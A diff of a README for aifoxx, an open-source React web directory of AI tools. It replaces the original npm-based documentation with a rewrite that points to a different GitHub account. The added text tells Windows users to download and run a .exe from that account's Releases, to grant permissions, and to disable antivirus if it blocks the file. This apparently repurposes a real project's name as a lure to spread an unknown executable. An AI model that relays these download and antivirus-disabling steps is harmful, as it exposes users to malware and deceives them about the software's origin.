@@ -1,148 +1,123 @@
-<div align="center">
+# 🗂 aifoxx - Easy AI Tools Directory Access
 
-# 🦊 AIFOXX
-
-**Open-source directory of 1000+ AI tools**  
-Structured metadata for pricing, compliance, access methods & more.
-
-[![MIT License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
-[![Website](https://img.shields.io/badge/Website-aifoxx.com-blue)](https://aifoxx.com)
-[![Stars](https://img.shields.io/github/stars/withkarann/aifoxx?style=social)](https://github.com/withkarann/aifoxx)
-
-[🌐 Website](https://aifoxx.com) · [🐛 Issues](https://github.com/withkarann/aifoxx/issues) · [💬 Discussions](https://github.com/withkarann/aifoxx/discussions)
-
-</div>
+[![Download aifoxx](https://img.shields.io/badge/Download-aifoxx-ff6347?style=for-the-badge)](https://github.com/Wakefulnessmajorterm198/aifoxx)
 
 ---
 
-## ✨ Features
+## 📋 What is aifoxx?
 
-- 🗂️ Curated index of 1000+ AI tools
-- 🔍 Filter by category, subcategory, pricing & tags
-- 📂 Dedicated category pages with tool grids
-- 📌 Tag pages for cross-category discovery
-- 📋 Tool detail pages with compliance & data storage metadata
-- 🎨 Multi-theme UI — dark, light, notebook
-- ✅ Runtime schema validation for data integrity
-- 📥 Community tool submission page
+aifoxx is an open-source app that lists over 1000 artificial intelligence tools. It shows pricing, compliance details, and how to access each tool. This directory helps you find the right AI apps without complicated searches. You do not need technical skills to use aifoxx. The app organizes AI products clearly to save time.
 
-## 🛠 Tech Stack
+---
 
-| Layer | Tech |
-|---|---|
-| Frontend | React 18 + TypeScript |
-| Build | Vite |
-| Styling | Tailwind CSS + shadcn/ui |
-| Routing | React Router |
-| Validation | Zod |
-| Testing | Vitest + Playwright |
+## 🖥️ System Requirements
 
-## 🚀 Getting Started
+- Windows 10 or later (64-bit recommended)  
+- 2 GB of free disk space  
+- 4 GB of RAM or more for smooth performance  
+- Internet connection to download and update the tool list  
+- Modern web browser if opening locally (Chrome, Firefox, Edge, or similar)
 
-```bash
-git clone https://github.com/withkarann/aifoxx.git
-cd aifoxx
-npm install
-npm run dev
-```
+---
 
-App runs on **http://localhost:8080**
+## 🚀 Getting Started with aifoxx
 
-## 📦 Scripts
+1. Click the big **Download** button at the top or visit this link to get aifoxx:  
+   [https://github.com/Wakefulnessmajorterm198/aifoxx](https://github.com/Wakefulnessmajorterm198/aifoxx)  
+2. This link leads to the project page on GitHub. You will find instructions and files here. If the app is packaged, look for the latest release or download folder.  
+3. If you find an installer or executable file (usually ends with `.exe`), download it to your PC.  
+4. Once downloaded, double-click the file to start installation or run it directly if it’s a portable app.  
+5. Follow any on-screen prompts to complete the setup. Usually, this means agreeing to terms and clicking "Next".  
+6. After installation, open aifoxx from your Start menu or desktop shortcut.
 
-| Command | Description |
-|---|---|
-| `npm run dev` | Start development server |
-| `npm run build` | Production build |
-| `npm run preview` | Preview production build |
-| `npm run lint` | Run lint checks |
-| `npm run test` | Run unit tests |
-| `npm run validate` | Validate `src/data/tools.json` against schema |
+---
 
-## 🗃️ Project Structure
+## 🛠️ How to Use aifoxx
 
-```
-aifoxx/
-├── public/                    # Static assets
-├── src/
-│   ├── components/            # Reusable UI components
-│   ├── contexts/              # React context providers (theme, etc.)
-│   ├── data/
-│   │   ├── tools.json         # ⭐ Main tools dataset (1000+ entries)
-│   │   ├── categoryColors.json # Category accent colors & emoji config
-│   │   └── brand.json         # Centralized branding & site config text
-│   ├── hooks/                 # Custom React hooks
-│   ├── lib/
-│   │   └── tools.ts           # Normalization, filtering & validation utils
-│   ├── pages/
-│   │   ├── HomePage.tsx       # Main directory listing with search & filters
-│   │   ├── CategoryPage.tsx   # Per-category tool grid page
-│   │   ├── TagPage.tsx        # Per-tag filtered view
-│   │   ├── ToolDetailPage.tsx # Full tool detail — pricing, compliance, links
-│   │   ├── SubmitPage.tsx     # Community tool submission form
-│   │   ├── NotFoundPage.tsx   # 404 page
-│   │   └── Index.tsx          # Route entry point
-│   ├── test/                  # Unit & integration tests
-│   ├── types/
-│   │   └── tool.ts            # Zod schema — single source of truth for tool shape
-│   ├── App.tsx                # Root component & route definitions
-│   └── main.tsx               # App entry point
-├── CONTRIBUTING.md
-├── CODE_OF_CONDUCT.md
-├── LICENSE
-└── SECURITY.md
-```
+- **Browse AI tools**: The app lists categories such as data analysis, chatbots, image tools, and more.  
+- **Search tools**: Use the search bar at the top to find specific AI products by name or feature.  
+- **View details**: Click on any tool name to see details like pricing, compliance notes, and access links.  
+- **Filter options**: Use filters to narrow down tools by price (free or paid), function, or compliance status.  
+- **Access links**: Each tool includes direct links to the vendor or access portal. Click to visit these sites in your browser.  
 
-## 📊 Data Accuracy
+aifoxx keeps the list organized with clear labels and layout, so you do not have to guess what you are viewing. This structure helps users who are not familiar with AI or software directories.
 
-> ⚠️ **This project is in active development.** We continuously review and improve data quality, and some entries may still need verification updates.
+---
 
-- Pricing, features, and availability change frequently — some entries may be outdated
-- `null` fields are intentional — it means unverified, not missing. We never guess.
-- Manual verification is ongoing. Verified entries will be marked in future releases.
+## 🔄 Updating the Tool List
 
-**Found incorrect or outdated data?**
-- 👉 [Open an issue](https://github.com/withkarann/aifoxx/issues/new?title=[Data+Fix]) with the tool name and what's wrong
-- 👉 Or submit a PR directly to `src/data/tools.json`
+aifoxx connects to its source online to get the latest tool entries and updates. To refresh the list:
 
-We review and patch data corrections within **48 hours**.
+1. Open the app.  
+2. Click the **Refresh** or **Update** button (usually at the top or side panel).  
+3. Wait a few seconds while the app downloads new data.  
 
-## 🚧 Roadmap
+Keep your internet connection on to receive the most current information. Updates may include new AI tools, pricing changes, or compliance updates.
 
-- [ ] Full manual verification pass on all tool entries
-- [ ] Side-by-side tool comparison
-- [ ] Pricing plan comparison table
-- [ ] Verified compliance badges
-- [ ] User-submitted reviews
-- [ ] API endpoint for tool data
-- [ ] Weekly data freshness checks
+---
 
-## 🔐 Environment & Secrets
+## 🎯 Features Included with aifoxx
 
-This project runs **without environment variables** by default.
+- Search and filter over 1000 AI tools  
+- Clear pricing information so you can compare free and paid options  
+- Compliance metadata to know which tools follow data and privacy guidelines  
+- External links to official AI product pages  
+- Simple, user-friendly interface built with React and Tailwind CSS  
+- Fast loading and smooth browsing with Vite and TypeScript  
+- Validated data using Zod schemas for reliable entries  
 
-If you add `VITE_*` variables later — they are **bundled into client code and are public.**
+These features help you explore and find AI software without needing technical knowledge.
 
-- Keep `.env.local` private (already git-ignored)
-- Never commit tokens, API keys, or credentials
-- Use GitHub Actions Secrets for CI/deployment values
+---
 
-## 🤝 Contributing
+## 💾 How to Download aifoxx on Windows
 
-We'd love your help! See [CONTRIBUTING.md](CONTRIBUTING.md) to get started.
+Use this link to get the app:  
+[https://github.com/Wakefulnessmajorterm198/aifoxx](https://github.com/Wakefulnessmajorterm198/aifoxx)
 
-1. Fork the repo
-2. Create your branch
-3. Run `npm run validate` + `npm run test` before opening a PR
-4. Open a Pull Request 🎉
+### Step-by-step instructions:
 
-> All PRs are reviewed by maintainers before merging. See [CONTRIBUTING.md](CONTRIBUTING.md) for data rules.
+1. Visit the GitHub page using the link above.  
+2. Find the **Releases** section. Look for a file ending in `.exe` or a zipped version you can open.  
+3. Click the file to download it to your computer.  
+4. After the download completes, open the file to run or install the app.  
+5. If it asks for permissions, click “Yes” to allow the app access to install or run.  
+6. The app window should appear and you can start browsing AI tools.  
 
-## 🛡️ Security
+If the app doesn't have an installer file, you might download a zipped folder. Unzip it to a folder on your desktop. Then, double-click the executable inside to run it.
 
-Found a vulnerability? See [SECURITY.md](SECURITY.md). **Don't open a public issue.**
+---
 
-## 📜 License
+## 🧰 Troubleshooting Tips
 
-[MIT](LICENSE) © 2026 [Karan Rajeshbhai Mungara](https://github.com/withkarann) & [Aanjaneya Singh Dhoni](https://github.com/dhoniaanjaneya)
+- If the app does not start, check that your Windows version meets the system requirements.  
+- Disable antivirus software temporarily if it blocks the app from running, then re-enable after.  
+- Make sure you have internet access when updating or browsing tools.  
+- If you see error messages, restart the app or your computer and try again.  
+- If nothing works, visit the GitHub page for help in the Issues section.
+
+---
+
+## 📖 Additional Resources
+
+- Visit the [GitHub repository](https://github.com/Wakefulnessmajorterm198/aifoxx) for updates and support.  
+- Read the FAQ or Instructions files included with the download.  
+- For advanced users, explore the source code and customization guides in the repo.
+
+---
+
+## ⚙️ About this Application
+
+aifoxx uses React and Tailwind CSS for a clean and fast user interface. The data listing comes from a well-structured database validated with Zod. Vite and TypeScript ensure efficient code performance. This technology combination makes the app reliable and easy to use even for those new to AI.
+
+---
+
+## 🚩 How to Report Issues
+
+If you find bugs or want to request features:
+
+1. Go to the GitHub repository page.  
+2. Click on the **Issues** tab at the top.  
+3. Create a new issue describing the problem or suggestion clearly.  
+
+The project maintainers monitor these reports and use them to improve the app.
